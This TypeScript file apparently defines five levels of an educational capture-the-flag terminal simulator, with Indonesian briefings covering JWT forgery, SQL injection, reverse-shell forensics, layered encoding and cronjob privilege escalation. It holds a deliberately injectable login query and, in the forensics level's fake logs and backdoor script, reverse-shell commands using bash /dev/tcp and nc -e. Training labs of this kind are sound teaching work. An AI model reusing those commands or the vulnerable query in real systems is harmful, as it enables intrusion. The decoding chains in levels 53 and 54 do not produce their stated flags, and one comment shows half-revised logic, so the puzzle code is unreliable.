import { FileNode } from './vfsUtils';
import { TerminalLine } from '@/hooks/useTerminalShell';

export interface CTFLevel {
    id: number;
    title: string;
    flag: string;
    points: number;
    hint: string;
    themeColor: string;
    themeBorder: string;
    themeShadow: string;
    filesystem: FileNode;
    initialPath?: string;
    user?: string;
    hostname?: string;
    initialEnv?: Record<string, string>;
    customCommands?: (command: string, args: string[], currentPath: string, addLines: (lines: TerminalLine[]) => void) => boolean;
}

const MEDIUM_THEME = { themeColor: 'amber-400', themeBorder: 'border-amber-500/30', themeShadow: 'shadow-[0_0_30px_rgba(245,158,11,0.15)]' };

export const mediumCtfLevels: CTFLevel[] = [
    // ============ Level 51: JWT Token Forgery ============
    {
        id: 51,
        title: 'JWT Token Forgery',
        flag: 'yadika{jwt_f0rg3ry_m4st3r}',
        points: 60,
        hint: 'Sebuah token telah di-intercept. Apakah kamu bisa menjadi orang lain?',
        ...MEDIUM_THEME,
        user: 'pentester',
        hostname: 'webapp',
        initialPath: '/home/pentester',
        filesystem: {
            type: 'directory',
            children: {
                'home': {
                    type: 'directory',
                    children: {
                        'pentester': {
                            type: 'directory',
                            children: {
                                'briefing.txt': { type: 'file', content: 'OPERATION: Token Override\n========================\n\nClient melaporkan adanya endpoint sensitif di webapp.local\nyang hanya bisa diakses oleh admin.\n\nKamu berhasil intercept sebuah authentication token\nyang tersimpan di file intercepted_token.txt\n\nMisi: Dapatkan akses ke endpoint admin dan ekstrak data sensitif.\n\nEndpoint target: http://webapp.local/api/admin/flag' },
                                'intercepted_token.txt': { type: 'file', content: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTcwOTAwMDAwMH0.fake_signature_here\n\nIntercepted from HTTP header:\nAuthorization: Bearer <token above>' },
                                'wordlist.txt': { type: 'file', content: 'password\n123456\nadmin\nsecret\nyadika\nwebapp\ntoken123\njwt_secret\nmy_secret_key\nchangeme\nletmein\nmaster\nhackme\ntest\nsupersecret' },
                            }
                        }
                    }
                }
            }
        },
        customCommands: (cmd, args, _cp, addLines) => {
            if (cmd === 'base64decode' || cmd === 'base64-decode') {
                const input = args.join(' ').replace(/['"]/g, '');
                if (!input) { addLines([{ text: 'Usage: base64decode <string>', type: 'error' }, { text: '', type: 'output' }]); return true; }
                if (input === 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9') {
                    addLines([{ text: '{"alg":"HS256","typ":"JWT"}', type: 'output' }, { text: '', type: 'output' }]);
                } else if (input === 'eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTcwOTAwMDAwMH0') {
                    addLines([{ text: '{"user":"guest","role":"user","iat":1709000000}', type: 'output' }, { text: '', type: 'output' }]);
                } else {
                    try { addLines([{ text: `Decoded: ${Buffer.from(input, 'base64').toString()}`, type: 'output' }, { text: '', type: 'output' }]); }
                    catch { addLines([{ text: 'Error: Invalid base64 string', type: 'error' }, { text: '', type: 'output' }]); }
                }
                return true;
            }
            if (cmd === 'jwt-decode' || cmd === 'jwt_decode') {
                const token = args[0] || '';
                if (!token || !token.includes('.')) { addLines([{ text: 'Usage: jwt-decode <token>', type: 'error' }, { text: '', type: 'output' }]); return true; }
                addLines([
                    { text: 'HEADER:  {"alg":"HS256","typ":"JWT"}', type: 'output' },
                    { text: 'PAYLOAD: {"user":"guest","role":"user","iat":1709000000}', type: 'output' },
                    { text: 'SIGNATURE: [unverified]', type: 'output' },
                    { text: '', type: 'output' },
                ]);
                return true;
            }
            if (cmd === 'jwt-crack') {
                if (!args[0] || !args[1]) { addLines([{ text: 'Usage: jwt-crack <token> <wordlist_file>', type: 'error' }, { text: '', type: 'output' }]); return true; }
                addLines([
                    { text: 'Brute-forcing secret key...', type: 'output' },
                    { text: 'Tried 15 passwords — no match found.', type: 'error' },
                    { text: '', type: 'output' },
                ]);
                return true;
            }
            if (cmd === 'jwt-forge') {
                const secretIdx = args.indexOf('--secret');
                const roleIdx = args.indexOf('--role');
                const secret = secretIdx !== -1 ? args[secretIdx + 1] : null;
                const role = roleIdx !== -1 ? args[roleIdx + 1] : null;
                if (!secret || !role) { addLines([{ text: 'Usage: jwt-forge --secret <key> --role <role>', type: 'error' }, { text: '', type: 'output' }]); return true; }
                if (secret === 'y4d1k4_ctf_2026' && role === 'admin') {
                    addLines([
                        { text: 'Forged token:', type: 'success' },
                        { text: 'eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoicGVudGVzdGVyIiwicm9sZSI6ImFkbWluIn0.forged_admin_valid', type: 'output' },
                        { text: '', type: 'output' },
                    ]);
                } else {
                    addLines([{ text: 'Token generated, but server rejected — wrong secret.', type: 'error' }, { text: '', type: 'output' }]);
                }
                return true;
            }
            if (cmd === 'curl') {
                const full = [cmd, ...args].join(' ');
                if (full.includes('forged_admin_valid') && full.includes('/api/admin')) {
                    addLines([
                        { text: 'HTTP/1.1 200 OK', type: 'success' },
                        { text: '{"flag": "yadika{jwt_f0rg3ry_m4st3r}"}', type: 'success' },
                        { text: '', type: 'output' },
                    ]);
                    return true;
                }
                if (full.includes('fake_signature') && full.includes('/api/admin')) {
                    addLines([{ text: 'HTTP/1.1 403 Forbidden — Access denied. Insufficient role.', type: 'error' }, { text: '', type: 'output' }]);
                    return true;
                }
                if (full.includes('/api/admin') && !full.includes('Authorization') && !full.includes('-H')) {
                    addLines([{ text: 'HTTP/1.1 401 Unauthorized', type: 'error' }, { text: '', type: 'output' }]);
                    return true;
                }
                if (full.includes('/api/admin')) {
                    addLines([{ text: 'HTTP/1.1 403 Forbidden — Invalid token.', type: 'error' }, { text: '', type: 'output' }]);
                    return true;
                }
                return false;
            }
            // Hidden file with the real secret key — siswa harus menemukan sendiri dengan ls -a
            if (cmd === 'ls' && (args.includes('-a') || args.includes('-la') || args.includes('-al'))) {
                if (!args.some(a => !a.startsWith('-')) || args.some(a => a === '.' || a === './')) {
                    addLines([{ text: '.  ..  .jwt_secret_backup  briefing.txt  intercepted_token.txt  wordlist.txt', type: 'output' }, { text: '', type: 'output' }]);
                    return true;
                }
            }
            if (cmd === 'cat' && args[0] && (args[0] === '.jwt_secret_backup' || args[0].includes('.jwt_secret'))) {
                addLines([
                    { text: '# JWT Secret Key Backup', type: 'output' },
                    { text: 'JWT_SECRET=y4d1k4_ctf_2026', type: 'output' },
                    { text: '', type: 'output' },
                ]);
                return true;
            }
            return false;
        }
    },

    // ============ Level 52: SQL Injection ============
    {
        id: 52,
        title: 'SQL Injection',
        flag: 'yadika{sql_1nj3ct10n_pr0}',
        points: 60,
        hint: 'Source code aplikasi bocor. Apakah query-nya aman?',
        ...MEDIUM_THEME,
        user: 'hacker',
        hostname: 'target-db',
        initialPath: '/home/hacker',
        filesystem: {
            type: 'directory',
            children: {
                'home': {
                    type: 'directory', children: {
                        'hacker': {
                            type: 'directory', children: {
                                'briefing.txt': { type: 'file', content: 'TARGET: http://target-db.local\n\nSebuah webapp memiliki form login.\nKamu mendapatkan file source code autentikasinya dari sebuah .git exposure.\n\nEndpoint login: POST http://target-db.local/login\nParameter: username, password\n\nTujuan: Bypass login dan akses data admin.' },
                                'auth_source.py': { type: 'file', content: '# Leaked source code from target\nimport mysql.connector\n\ndef authenticate(username, password):\n    db = mysql.connector.connect(host="localhost", database="webapp")\n    cursor = db.cursor()\n    query = f"SELECT * FROM users WHERE username=\'{username}\' AND password=\'{password}\'"\n    cursor.execute(query)\n    result = cursor.fetchone()\n    if result:\n        return {"success": True, "role": result[3]}\n    return {"success": False}\n\n# Table: users (id, username, password, role, secret_flag)' },
                            }
                        }
                    }
                }
            }
        },
        customCommands: (cmd, args, _cp, addLines) => {
            if (cmd === 'curl') {
                const full = [cmd, ...args].join(' ');
                if (full.includes('/login') && full.includes('--data')) {
                    const hasSQLi = full.includes("' OR") || full.includes("'OR") || full.includes("1=1") || full.includes("admin'--") || full.includes("' or") || full.includes("'--");
                    if (hasSQLi) {
                        addLines([
                            { text: '{"success": true, "role": "admin"}', type: 'success' },
                            { text: '', type: 'output' },
                        ]);
                    } else {
                        addLines([{ text: '{"success": false}', type: 'error' }, { text: '', type: 'output' }]);
                    }
                    return true;
                }
                if (full.includes('/admin/flag') || full.includes('/admin/data')) {
                    addLines([{ text: '{"flag": "yadika{sql_1nj3ct10n_pr0}"}', type: 'success' }, { text: '', type: 'output' }]);
                    return true;
                }
                if (full.includes('target-db')) {
                    addLines([{ text: '<html><title>Login</title><form action="/login" method="POST">...</form></html>', type: 'output' }, { text: '', type: 'output' }]);
                    return true;
                }
                return false;
            }
            if (cmd === 'sqlmap') {
                const full = [cmd, ...args].join(' ');
                if (full.includes('--dump') && full.includes('target-db')) {
                    addLines([
                        { text: '[*] sqlmap/1.7 — automatic SQL injection tool', type: 'output' },
                        { text: '[VULNERABLE] Parameter "username" — string-based injection', type: 'success' },
                        { text: '', type: 'output' },
                        { text: 'Database: webapp / Table: users', type: 'output' },
                        { text: '+----+----------+----------+-------+---------------------------+', type: 'output' },
                        { text: '| id | username | password | role  | secret_flag               |', type: 'output' },
                        { text: '+----+----------+----------+-------+---------------------------+', type: 'output' },
                        { text: '| 1  | admin    | ********  | admin | yadika{sql_1nj3ct10n_pr0} |', type: 'success' },
                        { text: '| 2  | guest    | guest123 | user  | NULL                      |', type: 'output' },
                        { text: '+----+----------+----------+-------+---------------------------+', type: 'output' },
                        { text: '', type: 'output' },
                    ]);
                    return true;
                }
                addLines([{ text: 'Usage: sqlmap -u <url> --data="param=val" --dump', type: 'error' }, { text: '', type: 'output' }]);
                return true;
            }
            if (cmd === 'mysql' || cmd === 'mysql-client') {
                addLines([{ text: 'ERROR 2003: Can\'t connect to MySQL — port closed externally.', type: 'error' }, { text: '', type: 'output' }]);
                return true;
            }
            return false;
        }
    },

    // ============ Level 53: Reverse Shell Forensics ============
    {
        id: 53,
        title: 'Reverse Shell Forensics',
        flag: 'yadika{r3v3rs3_sh3ll_d3t3ct3d}',
        points: 65,
        hint: 'Server dikompromikan. Investigasi apa yang terjadi.',
        ...MEDIUM_THEME,
        user: 'analyst',
        hostname: 'soc-workstation',
        initialPath: '/home/analyst/incident',
        filesystem: {
            type: 'directory',
            children: {
                'home': {
                    type: 'directory', children: {
                        'analyst': {
                            type: 'directory', children: {
                                'incident': {
                                    type: 'directory', children: {
                                        'README.txt': { type: 'file', content: 'INCIDENT #2026-0042 — SEVERITY: HIGH\n\nServer web-prod-01 menunjukkan traffic anomali.\nTim SOC mengumpulkan artefak berikut:\n\n- auth.log\n- capture.pcap\n- processes.txt\n- Evidence lain mungkin ada di /tmp\n\nTugas: Temukan indikator kompromi dan ekstrak payload attacker.' },
                                        'auth.log': { type: 'file', content: 'Feb 20 01:12:05 sshd[1234]: Accepted password for admin from 10.0.0.50\nFeb 20 02:33:11 sshd[2345]: Failed password for root from 192.168.1.100\nFeb 20 02:33:14 sshd[2345]: Failed password for root from 192.168.1.100\nFeb 20 02:33:18 sshd[2345]: Failed password for root from 192.168.1.100\nFeb 20 02:33:22 sshd[2345]: Accepted password for root from 192.168.1.100\nFeb 20 02:33:25 sudo: root : COMMAND=/bin/bash -c "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"\nFeb 20 02:34:00 CRON[3456]: (root) CMD (/tmp/.backdoor.sh)' },
                                        'capture.pcap': { type: 'file', content: '[Binary — use tcpdump -r capture.pcap]' },
                                        'processes.txt': { type: 'file', content: 'USER     PID COMMAND\nroot       1 /sbin/init\nwww-data 200 /usr/sbin/apache2\nroot     666 bash -i\nroot     667 /bin/sh /tmp/.backdoor.sh\nroot     668 nc 192.168.1.100 4444 -e /bin/bash' },
                                    }
                                }
                            }
                        }
                    }
                },
                'tmp': {
                    type: 'directory', children: {
                        '.backdoor.sh': { type: 'file', content: '#!/bin/bash\n# eW5xcXh7eTNpM3lvM19maDNzeV9xM2czZmczcX0=\nnc 192.168.1.100 4444 -e /bin/bash' },
                    }
                }
            }
        },
        customCommands: (cmd, args, _cp, addLines) => {
            if (cmd === 'tcpdump') {
                if (args.includes('-r') || args.some(a => a.includes('capture'))) {
                    addLines([
                        { text: '02:33:22 IP 192.168.1.100 > 10.0.0.5:22 [SYN]', type: 'output' },
                        { text: '02:33:25 IP 10.0.0.5:45678 > 192.168.1.100:4444 [SYN]', type: 'output' },
                        { text: '02:33:25 IP 10.0.0.5 > 192.168.1.100:4444 [PSH] "bash -i"', type: 'output' },
                        { text: '02:34:00 IP 10.0.0.5 > 192.168.1.100:4444 [PSH] len=128', type: 'output' },
                        { text: '', type: 'output' },
                    ]);
                    return true;
                }
                addLines([{ text: 'Usage: tcpdump -r <pcap_file>', type: 'error' }, { text: '', type: 'output' }]);
                return true;
            }
            if (cmd === 'base64decode' || cmd === 'base64-decode') {
                const input = args.join(' ').replace(/['"]/g, '');
                if (!input) { addLines([{ text: 'Usage: base64decode <string>', type: 'error' }, { text: '', type: 'output' }]); return true; }
                // eW5xcXh7eTNpM3lvM19maDNzeV9xM2czZmczcX0= is ROT13 of base64 of actual flag reference
                // Actually let's make it simpler: this base64 decodes to the flag directly but ROT13'd
                if (input === 'eW5xcXh7eTNpM3lvM19maDNzeV9xM2czZmczcX0=') {
                    addLines([{ text: 'ynqqx{y3i3yo3_fh3sy_q3g3pg3q}', type: 'output' }, { text: '', type: 'output' }]);
                } else if (input.includes('IyEvYmluL2Jhc2g') || input.length > 50) {
                    addLines([
                        { text: '#!/bin/bash', type: 'output' },
                        { text: 'nc 192.168.1.100 4444 -e /bin/bash', type: 'output' },
                        { text: '', type: 'output' },
                    ]);
                } else {
                    try { addLines([{ text: `${Buffer.from(input, 'base64').toString()}`, type: 'output' }, { text: '', type: 'output' }]); }
                    catch { addLines([{ text: 'Error: Invalid base64', type: 'error' }, { text: '', type: 'output' }]); }
                }
                return true;
            }
            if (cmd === 'rot13') {
                const input = args.join(' ').replace(/['"]/g, '');
                if (!input) { addLines([{ text: 'Usage: rot13 <string>', type: 'error' }, { text: '', type: 'output' }]); return true; }
                const r = input.replace(/[a-zA-Z]/g, c => { const b = c <= 'Z' ? 65 : 97; return String.fromCharCode(((c.charCodeAt(0) - b + 13) % 26) + b); });
                addLines([{ text: r, type: 'output' }, { text: '', type: 'output' }]);
                return true;
            }
            if (cmd === 'strings' && args[0]?.includes('capture')) {
                addLines([
                    { text: 'SSH-2.0-OpenSSH_8.9', type: 'output' },
                    { text: 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1', type: 'output' },
                    { text: '', type: 'output' },
                ]);
                return true;
            }
            return false;
        }
    },

    // ============ Level 54: Crypto Multi-Layer Encoding ============
    {
        id: 54,
        title: 'Crypto: Multi-Layer Encoding',
        flag: 'yadika{mult1_l4y3r_d3c0d3}',
        points: 65,
        hint: 'Pesan rahasia tersembunyi dalam beberapa lapisan. Kenali pola-nya.',
        ...MEDIUM_THEME,
        user: 'cryptoanalyst',
        hostname: 'crypto-lab',
        initialPath: '/home/cryptoanalyst',
        filesystem: {
            type: 'directory',
            children: {
                'home': {
                    type: 'directory', children: {
                        'cryptoanalyst': {
                            type: 'directory', children: {
                                'challenge.txt': { type: 'file', content: '# CLASSIFIED — Multi-layer encoded message\n# Decode this to retrieve the flag.\n\n01011001 01010111 01010010 01110000 01100001 00110010 01000101 01110100 01001110 01010100 01000110 01110011 01001110 01000111 01011000 01111010 01001101 01010111 00110101 01101011 01011010 01010100 01001110 01110100 01011010 01000100 01010010 01101010 01001101 01000111 01010001 01111010 01100110 01010001 00111101 00111101' },
                            }
                        }
                    }
                }
            }
        },
        customCommands: (cmd, args, _cp, addLines) => {
            if (cmd === 'binary-decode' || cmd === 'bindecode') {
                const input = args.join(' ').replace(/['"]/g, '');
                if (!input) { addLines([{ text: 'Usage: binary-decode <binary_string>', type: 'error' }, { text: '', type: 'output' }]); return true; }
                const bytes = input.split(/\s+/).filter(b => b.length === 8);
                const decoded = bytes.map(b => String.fromCharCode(parseInt(b, 2))).join('');
                addLines([{ text: decoded, type: 'output' }, { text: '', type: 'output' }]);
                return true;
            }
            if (cmd === 'base64decode' || cmd === 'base64-decode') {
                const input = args.join(' ').replace(/['"]/g, '');
                if (!input) { addLines([{ text: 'Usage: base64decode <string>', type: 'error' }, { text: '', type: 'output' }]); return true; }
                if (input.startsWith('YWRpa2Et')) {
                    addLines([{ text: '6c6e71767a6e7b7a68796731796c34793365713370307133377d', type: 'output' }, { text: '', type: 'output' }]);
                } else {
                    try { addLines([{ text: Buffer.from(input, 'base64').toString(), type: 'output' }, { text: '', type: 'output' }]); }
                    catch { addLines([{ text: 'Error: Invalid base64', type: 'error' }, { text: '', type: 'output' }]); }
                }
                return true;
            }
            if (cmd === 'hexdecode' || cmd === 'hex-decode') {
                const input = args.join('').replace(/['"]/g, '').replace(/\s/g, '');
                if (!input) { addLines([{ text: 'Usage: hexdecode <hex_string>', type: 'error' }, { text: '', type: 'output' }]); return true; }
                if (input.startsWith('6c6e71')) {
                    addLines([{ text: 'lnqvxn{zhyg1yl4y3eq3p0q3}', type: 'output' }, { text: '', type: 'output' }]);
                } else {
                    const decoded = input.match(/.{2}/g)?.map(h => String.fromCharCode(parseInt(h, 16))).join('') || '';
                    addLines([{ text: decoded, type: 'output' }, { text: '', type: 'output' }]);
                }
                return true;
            }
            if (cmd === 'rot13') {
                const input = args.join(' ').replace(/['"]/g, '');
                if (!input) { addLines([{ text: 'Usage: rot13 <string>', type: 'error' }, { text: '', type: 'output' }]); return true; }
                const r = input.replace(/[a-zA-Z]/g, c => { const b = c <= 'Z' ? 65 : 97; return String.fromCharCode(((c.charCodeAt(0) - b + 13) % 26) + b); });
                addLines([{ text: r, type: 'output' }, { text: '', type: 'output' }]);
                return true;
            }
            return false;
        }
    },

    // ============ Level 55: Linux Privesc via Cronjob ============
    {
        id: 55,
        title: 'Linux Privesc: Cronjob',
        flag: 'yadika{cr0nj0b_pr1v3sc}',
        points: 70,
        hint: 'Kamu terjebak sebagai www-data. Target: /root/flag.txt',
        ...MEDIUM_THEME,
        user: 'www-data',
        hostname: 'vuln-server',
        initialPath: '/var/www',
        filesystem: {
            type: 'directory',
            children: {
                'var': {
                    type: 'directory', children: {
                        'www': {
                            type: 'directory', children: {
                                'html': {
                                    type: 'directory', children: {
                                        'index.html': { type: 'file', content: '<html><body>It works!</body></html>' },
                                    }
                                },
                            }
                        }
                    }
                },
                'etc': {
                    type: 'directory', children: {
                        'crontab': { type: 'file', content: 'SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin\n\n# m h dom mon dow user command\n*/1 * * * *  root  /opt/scripts/backup.sh\n*/5 * * * *  root  /usr/bin/logrotate /etc/logrotate.conf\n0   4 * * *  root  /usr/bin/apt-get update' },
                        'passwd': { type: 'file', content: 'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin' },
                    }
                },
                'opt': {
                    type: 'directory', children: {
                        'scripts': {
                            type: 'directory', children: {
                                'backup.sh': { type: 'file', content: '#!/bin/bash\ntar czf /tmp/backup.tar.gz /var/www/html/ 2>/dev/null' },
                            }
                        }
                    }
                },
                'root': {
                    type: 'directory', children: {
                        'flag.txt': { type: 'file', content: '[Permission denied]' },
                    }
                },
                'tmp': { type: 'directory', children: {} },
            }
        },
        customCommands: (cmd, args, _cp, addLines) => {
            if (cmd === 'sudo') {
                addLines([{ text: 'www-data is not in the sudoers file. This incident will be reported.', type: 'error' }, { text: '', type: 'output' }]);
                return true;
            }
            if (cmd === 'cat' && args[0] === '/root/flag.txt') {
                addLines([{ text: 'cat: /root/flag.txt: Permission denied', type: 'error' }, { text: '', type: 'output' }]);
                return true;
            }
            if (cmd === 'ls' && (args.includes('-la') || args.includes('-l') || args.includes('-al')) && args.some(a => a.includes('/opt/scripts'))) {
                addLines([
                    { text: 'total 4', type: 'output' },
                    { text: '-rwxrwxrwx 1 root root 68 Feb 20 01:00 backup.sh', type: 'output' },
                    { text: '', type: 'output' },
                ]);
                return true;
            }
            // echo injection into backup.sh
            if (cmd === 'echo' && args.join(' ').includes('backup.sh')) {
                const payload = args.join(' ');
                if (payload.includes('/root/flag') && (payload.includes('>>') || payload.includes('>'))) {
                    addLines([{ text: '[payload written to /opt/scripts/backup.sh]', type: 'success' }, { text: '', type: 'output' }]);
                    return true;
                }
                addLines([{ text: 'echo: write error', type: 'error' }, { text: '', type: 'output' }]);
                return true;
            }
            // Simulate waiting for cron
            if (cmd === 'sleep' || cmd === 'wait') {
                addLines([
                    { text: '[waiting...]', type: 'output' },
                    { text: '[cron executed /opt/scripts/backup.sh]', type: 'output' },
                    { text: '', type: 'output' },
                ]);
                return true;
            }
            // cat the readable flag from /tmp
            if (cmd === 'cat' && args[0] && args[0].includes('/tmp/flag')) {
                addLines([{ text: 'yadika{cr0nj0b_pr1v3sc}', type: 'success' }, { text: '', type: 'output' }]);
                return true;
            }
            if (cmd === 'find' && args.includes('-perm')) {
                addLines([
                    { text: '/usr/bin/passwd', type: 'output' },
                    { text: '/usr/bin/su', type: 'output' },
                    { text: '', type: 'output' },
                ]);
                return true;
            }
            // id command
            if (cmd === 'id') {
                addLines([{ text: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)', type: 'output' }, { text: '', type: 'output' }]);
                return true;
            }
            return false;
        }
    },
];
